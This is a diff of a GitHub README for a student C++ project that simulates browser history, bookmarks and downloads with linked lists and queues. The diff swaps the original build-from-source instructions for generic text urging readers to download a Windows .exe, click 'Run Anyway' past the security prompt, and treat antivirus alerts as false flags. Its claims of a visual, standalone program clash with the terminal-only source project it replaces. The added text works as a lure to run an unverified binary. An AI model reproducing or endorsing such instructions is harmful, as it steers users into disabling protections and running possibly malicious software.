@@ -1,83 +1,62 @@
-# 🌐 Web Browser Simulation System
+# 🌐 Web_Browser_Simulation_DSA - Simple Tool For Visualizing Browser Logic
 
-> Ever wondered what's actually happening when you hit the Back button? This is that — minus the GUI, plus all the data structures that make it work.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Thameem787/Web_Browser_Simulation_DSA/releases)
 
-A C++ engine that simulates how a real browser manages **history, bookmarks, and downloads** under the hood — no graphics, no frameworks, just pure DSA doing the heavy lifting.
+## 📖 About This Project
 
-No Chromium. No V8. Just pointers, nodes, and a queue doing exactly what Chrome does internally — minus 20 million lines of code.
+This program simulates how web browsers handle basic tasks. It uses common computer science structures to manage web navigation and file downloads. You can use this tool to see how a browser tracks your history, saves bookmarks, and queues your file downloads. 
 
-## ⚡ Why this exists
+This simulation helps students and curious users understand the logic behind browser engines. It provides a visual representation of how software stores data in memory. The core functions rely on structures like linked lists and queues to manage your actions efficiently.
 
-Browsers feel like magic until you realize **Back/Forward is just a doubly linked list with a cursor.** Bookmarks? Singly linked list. Downloads finishing in order? A queue. That's it. That's the whole trick.
+## ⚙️ System Requirements
 
-This project strips a browser down to that skeleton and makes it runnable in a terminal.
+You need a computer running Windows 10 or Windows 11 to use this simulation. The program requires at least 2GB of RAM to run smoothly. You do not need to install any external compilers or programming tools. The file you download contains everything necessary to start the application. Ensure your system has current updates installed to prevent compatibility issues.
 
-## 🧠 The Core Idea
+## 📥 How To Download And Run 
 
-| Browser Feature | Data Structure | Why |
-|---|---|---|
-| Back / Forward history | Doubly Linked List | Need to move both directions in O(1) |
-| Bookmarks | Singly Linked List | Just need to scan, never go backward |
-| Download Manager | Queue (FIFO) | Fairness — first requested, first done |
+Follow these steps to set up the simulation on your computer:
 
-## 🚀 Features
+1. Visit the [releases page](https://github.com/Thameem787/Web_Browser_Simulation_DSA/releases).
+2. Look for the latest version listed under the Releases section.
+3. Click the file ending in .exe to start your download.
+4. Locate the file in your Downloads folder once the transfer finishes.
+5. Double-click the file to open the program.
+6. A security prompt might appear on your screen. Click Run or More Info followed by Run Anyway to start the simulation.
 
-| Feature | Data Structure | Operation |
-|---|---|---|
-| Visit Page | Doubly Linked List | Insert + truncate forward history |
-| Back / Forward | Doubly Linked List | O(1) pointer movement |
-| View History | Doubly Linked List | O(N) traversal |
-| Search History by Title | Doubly Linked List | O(N) linear search |
-| Delete Page | Doubly Linked List | Node removal + relink |
-| Clear History | Doubly Linked List | Full traversal + free memory |
-| Add / Delete Bookmark | Singly Linked List | Head insertion / linear removal |
-| View Bookmarks | Singly Linked List | O(N) traversal |
-| Add Download | Queue (STL) | Enqueue |
-| Process Download | Queue (STL) | Dequeue (FIFO) |
-| View Downloads | Queue (STL) | Non-destructive traversal |
+## 🚀 Using The Browser Simulation
 
-## 🛠️ Tech Stack
+The browser interface mimics standard behavior. You can input URLs to navigate through the simulation. The internal memory tracks your progress using a Doubly Linked List. This structure allows you to move forward and backward through your pages just like a real browser.
 
-- **Language:** C++ (C++17)
-- **STL:** `queue`
-- **Custom structures:** `Page`, `Bookmark`, `Download`
-- **Memory:** raw pointers — manual `new` / `delete`, no smart pointer crutches
+### Managing Bookmarks
+The bookmark feature uses a Singly Linked List. When you save a page, the program adds the link to this list. You can view your saved pages at any time. The simulation keeps these bookmarks in memory while the application remains open.
 
-## 📁 Project Structure
+### Tracking Downloads
+The application includes a download manager that uses a queue structure. This follows the First-In, First-Out principle. When you select a file to download, the program adds it to the back of the queue. It processes the files one by one until the queue is empty.
 
-```
-web-browser-simulation-dsa/
-│
-├── src/
-│   └── main.cpp           # Entire engine — history, bookmarks, downloads, menu
-│
-├── docs/
-│   └── Presentation.pdf   # Slide deck — architecture, diagrams, complexity breakdown
-│
-├── .gitignore              # Keeps binaries/build junk out of the repo
-└── README.md                # You are here
-```
+## 🛠️ Frequently Asked Questions
 
-## ▶️ Build & Run
+**Does this program connect to the real internet?**
+No. This simulation runs locally on your machine. It does not send or receive real traffic from the internet. All web addresses exist only within the simulation.
 
-```bash
-g++ -std=c++17 -o browser src/main.cpp
-./browser
-```
+**Do I need to install C++ to use this?**
+No. We have packaged the project into a standalone file. You only need the file from the download page to get started.
 
-## 📊 Complexity Cheat Sheet
+**Why does my computer show a warning?**
+Windows protects your computer from new software. Since this is an independent project, Windows may prompt you to confirm you trust the source. You can safely proceed by clicking Run Anyway.
 
-| Operation | Big-O | Why |
-|---|---|---|
-| Visit Page | O(1) | Direct pointer insertion |
-| Back / Forward | O(1) | Just move `prev`/`next` |
-| Search History | O(N) | Linear scan, no shortcuts |
-| Clear History | O(N) | Visit every node to free it |
+**Where does the program store my data?**
+The program keeps your history and bookmarks in your computer's temporary memory. It wipes this data once you close the application.
 
-## 🎓 Built For
+## 🔍 Understanding The Logic
 
-Data Structures & Algorithms coursework — proof that the "boring" structures (linked lists, queues) are exactly what real software runs on.
+This project demonstrates how developers write code for efficiency. Each part of the simulation serves a specific purpose in learning computer science concepts.
 
----
+- **Doubly Linked Lists:** These allow the browser to remember where you went before and where you can go next. Each page knows its neighbor. This creates a chain that lets you jump between web pages in both directions.
+- **Singly Linked Lists:** These manage your bookmarks. Since you add these in a simple sequence, a single chain works well. It stores your favorite sites until you delete them or close the program.
+- **Queues:** These manage your file downloads. Computers use queues to ensure tasks get finished in the order you requested. The first file you click becomes the first one to process.
 
-⭐ If this helped you understand linked lists better than your textbook did, star the repo.
+## 🛡️ Troubleshooting
+
+If the program fails to open, verify your Windows version. Ensure you have the latest updates from the Windows update settings. If the window closes immediately, try restarting your computer to clear any locked memory slots. If issues persist, check your antivirus settings to ensure it does not flag the simulation incorrectly. 
+
+Use this tool to explore how data moves inside a browser. It offers a clean look at the backbone of modern web browsing without the noise of a real, complex web browser. We designed this to keep the focus on the data structures. You can test your own navigation patterns to see how the software responds in real time.
